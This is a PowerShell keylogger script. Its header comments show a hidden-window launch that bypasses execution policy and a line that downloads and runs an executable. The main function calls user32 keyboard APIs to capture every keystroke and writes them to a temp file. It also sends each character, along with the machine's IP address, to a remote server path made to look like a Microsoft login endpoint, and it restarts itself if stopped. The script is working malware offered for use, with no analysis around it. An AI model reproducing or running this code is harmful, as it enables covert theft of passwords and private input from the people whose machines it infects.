# powershell -windowstyle hidden -ExecutionPolicy ByPass -File 1.ps1
# $down = New-Object System.Net.WebClient; $url = 'abc.exe'; $file = 'mess1.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
{
	$ip = "10.4.1.13"
	$url = "http://"+$ip+"/microsoft/auth.php"
	
	$env:HostIP = (
    Get-NetIPConfiguration |
    Where-Object {
        $_.IPv4DefaultGateway -ne $null -and
        $_.NetAdapter.Status -ne "Disconnected"
			}
		).IPv4Address.IPAddress
	echo $env:HostIP
	
  $signatures = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@

  $API = Add-Type -MemberDefinition $signatures -Name "Win32" -Namespace API -PassThru

  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    while ($true) {
      Start-Sleep -Milliseconds 40
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $API::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
          $null = [console]::CapsLock
          $virtualKey = $API::MapVirtualKey($ascii, 3)
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)
          $mychar = New-Object -TypeName System.Text.StringBuilder
          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
			$ccc = $mychar.ToString()
			$params = @{"g"=$ccc;
						"h"=$env:HostIP}
			Invoke-WebRequest -Uri $url -Method POST -Body $params
          }
        }
      }
    }
  }
  finally
  {
	Start-KeyLogger
  }
}

Start-KeyLogger

